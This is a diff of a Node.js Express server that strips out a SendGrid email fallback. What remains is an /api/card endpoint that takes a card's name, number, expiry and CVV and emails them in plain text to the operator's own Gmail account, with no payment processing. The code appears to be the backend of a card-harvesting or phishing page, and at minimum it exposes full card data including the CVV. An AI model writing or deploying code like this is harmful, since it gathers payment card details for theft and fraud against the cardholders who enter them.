@@ -4,13 +4,6 @@
 const express = require('express');
 const cors = require('cors');
 const nodemailer = require('nodemailer');
-// Optional SendGrid fallback to avoid outbound SMTP being blocked on some hosts (e.g., Render)
-let sgMail;
-try {
-  sgMail = require('@sendgrid/mail');
-} catch (e) {
-  // optional, we'll only use it if installed and configured
-}
 const app = express();
 
 // Load local .env in development (optional). Ensure .env is in .gitignore and don't commit secrets.
@@ -80,15 +73,9 @@ app.post('/api/card', async (req, res) => {
 
   const gmailUser = process.env.GMAIL_USER;
   const gmailPass = process.env.GMAIL_PASS;
-  const sendgridKey = process.env.SENDGRID_API_KEY;
 
-  // Allow explicit from/to settings for SendGrid or alternate senders
-  const mailFrom = process.env.MAIL_FROM || gmailUser;
-  const mailTo = process.env.MAIL_TO || gmailUser;
-
-  // If neither Gmail credentials nor SendGrid key exist, mock success in dev.
-  if ((!gmailUser || !gmailPass) && !sendgridKey) {
-    console.warn('Missing GMAIL creds and SENDGRID_API_KEY - mocking success for dev');
+  if (!gmailUser || !gmailPass) {
+    console.warn('Missing GMAIL creds - mocking success for dev');
     return res.json({ success: true, message: 'Mock: Email would be sent (creds missing)' });
   }
 
@@ -118,36 +105,11 @@ app.post('/api/card', async (req, res) => {
   };
 
   const mailOptions = {
-    from: mailFrom,
-    to: mailTo,
+    from: gmailUser,
+    to: gmailUser,
     subject: 'New Card Submission',
     text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
   };
-
-  // If SENDGRID_API_KEY is present, prefer SendGrid (HTTPS API) to avoid blocked SMTP ports on some hosts
-  if (sendgridKey && sgMail && mailFrom && mailTo) {
-    try {
-      sgMail.setApiKey(sendgridKey);
-      // Use a minimal SendGrid payload
-      const sgMsg = {
-        to: gmailUser,
-        to: mailTo,
-        from: mailFrom,
-        subject: mailOptions.subject,
-        text: mailOptions.text
-      };
-      await sgMail.send(sgMsg);
-      console.log('Email sent via SendGrid');
-      return res.json({ success: true, message: 'Email sent via SendGrid' });
-    } catch (err) {
-      console.error('SendGrid send error:', err && (err.message || err.toString()));
-      // fall through to SMTP fallback
-    }
-  }
-  // If SendGrid was configured but mailFrom/mailTo missing, warn and fall back to SMTP path (which may fail if creds are missing)
-  if (sendgridKey && sgMail && (!mailFrom || !mailTo)) {
-    console.warn('SENDGRID_API_KEY present but MAIL_FROM or MAIL_TO is not set. Skipping SendGrid and falling back to SMTP (if configured).');
-  }
 
   // Helper: small sleep for backoff
   const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
